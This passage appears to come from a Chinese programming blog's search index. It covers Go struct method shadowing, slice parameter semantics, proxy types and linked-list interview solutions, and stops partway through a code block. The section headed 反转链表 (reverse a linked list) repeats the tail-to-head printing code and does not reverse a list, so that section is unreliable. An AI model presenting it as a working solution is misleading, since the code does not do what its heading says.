*Student)</span> <span class="title">PrintInfo</span><span class="params">(i <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Student: tmp = &quot;</span>, tmp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := Student&#123;Person&#123;<span class="string">&quot;mike&quot;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="number">18</span>&#125;, <span class="number">666</span>, <span class="string">&quot;bj&quot;</span>&#125;</span><br><span class="line"><span class="comment">//就近原则：先找本作用域的方法，找不到再用继承的方法</span></span><br><span class="line">s.PrintInfo(<span class="string">&quot;1&quot;</span>) <span class="comment">//到底调用的是Person， 还是Student， 结论是Student</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//显式调用继承的方法</span></span><br><span class="line">s.Person.PrintInfo(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go切片作为函数参数会被改变吗</title>
      <link href="/2022/06/09/go%E5%88%87%E7%89%87%E4%BD%9C%E4%B8%BA%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%BC%9A%E8%A2%AB%E6%94%B9%E5%8F%98%E5%90%97/"/>
      <url>/2022/06/09/go%E5%88%87%E7%89%87%E4%BD%9C%E4%B8%BA%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%BC%9A%E8%A2%AB%E6%94%B9%E5%8F%98%E5%90%97/</url>
      
        <content type="html"><![CDATA[<p>slice 其实是一个结构体，包含了三个成员：len, cap, array。分别表示切片长度，容量，底层数据的地址。<br>当 slice 作为函数参数时，就是一个普通的结构体。其实很好理解：若直接传 slice，在调用者看来，实参 slice 并不会被函数中的操作改变；若传的是 slice 的指针，在调用者看来，是会被改变原 slice 的。<br>值得注意的是，不管传的是 slice 还是 slice 指针，如果改变了 slice 底层数组的数据，会反应到实参 slice 的底层数据。为什么能改变底层数组的数据？很好理解：底层数据在 slice 结构体里是一个指针，尽管 slice 结构体自身不会被改变，也就是说底层数据地址不会被改变。 但是通过指向底层数据的指针，可以改变切片的底层数据，没有问题。<br>通过 slice 的 array 字段就可以拿到数组的地址。在代码里，是直接通过类似 s[i]=10 这种操作改变 slice 底层数组元素值。<br>另外，值得注意的是，Go 语言的函数参数传递，只有值传递，没有引用传递。<br>来看一个代码片段：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;</span><br><span class="line">f(s)</span><br><span class="line">fmt.Println(s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">(s []<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">// i只是一个副本，不能改变s中元素的值</span></span><br><span class="line"><span class="comment">/*for _, i := range s &#123;</span></span><br><span class="line"><span class="comment">i++</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> s &#123;</span><br><span class="line">s[i] += <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行一下，程序输出：<br><code>[2 2 2]</code><br>果真改变了原始 slice 的底层数据。这里传递的是一个 slice 的副本，在 f 函数中，s 只是 main 函数中 s 的一个拷贝。在f 函数内部，对 s 的作用并不会改变外层 main 函数的 s。<br>要想真的改变外层 slice，只有将返回的新的 slice 赋值到原始 slice，或者向函数传递一个指向 slice 的指针。<br>我们再来看一个例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myAppend</span><span class="params">(s []<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line"><span class="comment">// 这里 s 虽然改变了，但并不会影响外层函数的 s</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myAppendPtr</span><span class="params">(s *[]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">// 会改变外层 s 本身</span></span><br><span class="line">*s = <span class="built_in">append</span>(*s, <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;</span><br><span class="line">newS := myAppend(s)</span><br><span class="line"></span><br><span class="line">fmt.Println(s)</span><br><span class="line">fmt.Println(newS)</span><br><span class="line"></span><br><span class="line">s = newS</span><br><span class="line"></span><br><span class="line">myAppendPtr(&amp;s)</span><br><span class="line">fmt.Println(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span>]</span><br><span class="line">[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">100</span>]</span><br><span class="line">[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">100</span> <span class="number">100</span>]</span><br></pre></td></tr></table></figure><p>myAppend 函数里，虽然改变了 s，但它只是一个值传递，并不会影响外层的 s，因此第一行打印出来的结果仍然是 [1 1 1]。<br>而 newS 是一个新的 slice，它是基于 s 得到的。因此它打印的是追加了一个 100 之后的结果： [1 1 1 100]。<br>最后，将 newS 赋值给了 s，s 这时才真正变成了一个新的slice。之后，再给 myAppendPtr 函数传入一个 s 指针，这回它真的被改变了：[1 1 1 100 100]。<br>最后再看一个例子，加深一下理解：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myApp</span><span class="params">(s []<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">s[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line"><span class="comment">// s := []int&#123;3, 3, 3&#125;</span></span><br><span class="line"><span class="built_in">new</span> := myApp(s)</span><br><span class="line">fmt.Printf(<span class="string">&quot;s的内存地址是%p\n&quot;</span>, s)</span><br><span class="line">fmt.Printf(<span class="string">&quot;new的内存地址是%p\n&quot;</span>, <span class="built_in">new</span>)</span><br><span class="line">fmt.Println(s)</span><br><span class="line">fmt.Println(<span class="built_in">new</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s的内存地址是<span class="number">0xc00001c140</span></span><br><span class="line"><span class="built_in">new</span>的内存地址是<span class="number">0xc00001c140</span></span><br><span class="line">[<span class="number">1</span>]</span><br><span class="line">[<span class="number">1</span> <span class="number">100</span>]</span><br></pre></td></tr></table></figure><p>可以看到，参数指针变量的值和原指针变量的值是一致的，<strong>也就是他们只是共用一个底层数组。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正向代理和反向代理</title>
      <link href="/2022/06/09/%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
      <url>/2022/06/09/%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="一句话描述"><a href="#一句话描述" class="headerlink" title="一句话描述"></a>一句话描述</h2><p>代理AKA假装，正向代理也就是假装proxy是客户端，反向代理代理的是服务端假装自己是服务器让client来访问。</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><ol><li>科学上网</li><li>加速访问</li><li>缓存数据 </li><li>授权访问</li><li>隐藏访问者</li></ol><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><ol><li>保护服务器 </li><li>负载均衡</li></ol>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go算法题整理之剑指offer</title>
      <link href="/2022/06/08/go%E7%AE%97%E6%B3%95%E9%A2%98%E6%95%B4%E7%90%86%E4%B9%8B%E5%89%91%E6%8C%87offer/"/>
      <url>/2022/06/08/go%E7%AE%97%E6%B3%95%E9%A2%98%E6%95%B4%E7%90%86%E4%B9%8B%E5%89%91%E6%8C%87offer/</url>
      
        <content type="html"><![CDATA[<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="从尾到头打印链表"><a href="#从尾到头打印链表" class="headerlink" title="从尾到头打印链表"></a><strong>从尾到头打印链表</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param head ListNode类 </span></span><br><span class="line"><span class="comment"> * @return int整型一维数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printListFromTailToHead</span><span class="params">( head *ListNode )</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">var</span> list []<span class="keyword">int</span></span><br><span class="line">    <span class="keyword">if</span> head==<span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    list = printListFromTailToHead(head.Next)</span><br><span class="line">    list = <span class="built_in">append</span>(list,head.Val)</span><br><span class="line">    <span class="keyword">return</span> list</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param head ListNode类 </span></span><br><span class="line"><span class="comment"> * @return int整型一维数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printListFromTailToHead</span><span class="params">( head *ListNode )</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">var</span> list []<span class="keyword">int</span></span><br><span class="line">    <span class="keyword">if</span> head==<span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    list = printListFromTailToHead(head.Next)</span><br><span class="line">    list = <span class="built_in">append</span>(list,head.Val)</span><br><span class="line">    <span class="keyword">return</span> list</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="合并两个排序的链表"><a href="#合并两个排序的链表" class="headerlink" title="合并两个排序的链表"></a>合并两个排序的链表</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pHead1 ListNode类 </span></span><br><span class="line"><span class="comment"> * @param pHead2 ListNode类 </span></span><br><span class="line"><span class="comment"> * @return ListNode类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Merge</span><span class="params">( pHead1 *ListNode ,  pHead2 *ListNode )</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    pre := &amp;ListNode&#123;&#125;</span><br><span class="line">    tmp := pre</span><br><span class="line">    <span class="keyword">for</span> pHead1!=<span class="literal">nil</span> &amp;&amp; pHead2!=<span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> pHead1.Val &lt;= pHead2.Val&#123;</span><br><span class="line">            pre.Next = pHead1</span><br><span class="line">            pHead1 = pHead1.Next</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pre.Next = pHead2</span><br><span class="line">            pHead2 = pHead2.Next</span><br><span class="line">        &#125;</span><br><span class="line">        pre = pre.Next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> pHead1 != <span class="literal">nil</span>&#123;</span><br><span class="line">        pre.Next = pHead1</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> pHead2 != <span class="literal">nil</span>&#123;</span><br><span class="line">        pre.Next = pHead2</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp.Next</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="两个链表的第一个公共结点"><a href="#两个链表的第一个公共结点" class="headerlink" title="两个链表的第一个公共结点"></a><strong>两个链表的第一个公共结点</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pHead1 ListNode类 </span></span><br><span class="line"><span class="comment"> * @param pHead2 ListNode类 </span></span><br><span class="line"><span class="comment"> * @return ListNode类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FindFirstCommonNode</span><span class="params">( pHead1 *ListNode ,  pHead2 *ListNode )</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pHead1 == <span class="literal">nil</span> || pHead2==<span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    up := pHead1</span><br><span class="line">    down := pHead2</span><br><span class="line">    <span class="keyword">for</span> pHead1 != pHead2 &#123;</span><br><span class="line">        <span class="keyword">if</span> pHead1 == <span class="literal">nil</span>&#123;</span><br><span class="line">            pHead1 = down</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pHead1 = pHead1.Next </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> pHead2 == <span class="literal">nil</span>&#123;</span><br><span class="line">            pHead2 = up</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pHead2 = pHead2.Next</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pHead1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="链表中环的入口结点"><a href="#链表中环的入口结点" class="headerlink" title="链表中环的入口结点"></a><strong>链表中环的入口结点</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EntryNodeOfLoop</span><span class="params">(pHead *ListNode)</span> *<span class="title">ListNode</span></span>&#123;</span><br><span class="line">        slow,fast := pHead,pHead</span><br><span class="line">        <span class="keyword">for</span> slow!=<span class="literal">nil</span> &amp;&amp; fast!= <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> slow==<span class="literal">nil</span> || fast==<span class="literal">nil</span>|| fast.Next==<span class="literal">nil</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">            &#125;</span><br><span class="line">            slow = slow.Next</span><br><span class="line">            fast = fast.Next.Next</span><br><span class="line">            <span class="keyword">if</span> slow == fast&#123;</span><br><span class="line">                slow = pHead</span><br><span class="line">                <span class="keyword">for</span> slow != fast&#123;</span><br><span class="line">                    slow = slow.Next</span><br><span class="line">                    fast = fast.Next</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> slow</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="链表中倒数最后k个结点"><a href="#链表中倒数最后k个结点" class="headerlink" title="链表中倒数最后k个结点"></a><strong>链表中倒数最后k个结点</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pHead ListNode类 </span></span><br><span class="line"><span class="comment"> * @param k int整型 </span></span><br><span class="line"><span class="comment"> * @return ListNode类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FindKthToTail</span><span class="params">( pHead *ListNode ,  k <span class="keyword">int</span> )</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    fast, slow := pHead, pHead</span><br><span class="line">    <span class="keyword">for</span> fast != <span class="literal">nil</span> &amp;&amp; k &gt; <span class="number">0</span> &#123;</span><br><span class="line">        k--</span><br><span class="line">        fast = fast.Next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> k &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> fast != <span class="literal">nil</span> &#123;</span><br><span class="line">        fast = fast.Next</span><br><span class="line">        slow = slow.Next</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> slow</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="复杂链表的复制"><a href="#复杂链表的复制" class="headerlink" title="复杂链表的复制"></a><strong>复杂链表的复制</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">type RandomListNode struct &#123;</span></span><br><span class="line"><span class="comment">    Label int</span></span><br><span class="line"><span class="comment">    Next *RandomListNode</span></span><br><span class="line"><span class="comment">    Random *RandomListNode</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param pHead RandomListNode类</span></span><br><span class="line"><span class="comment"> * @return RandomListNode类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Clone</span><span class="params">( head *RandomListNode )</span> *<span class="title">RandomListNode</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> head == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span 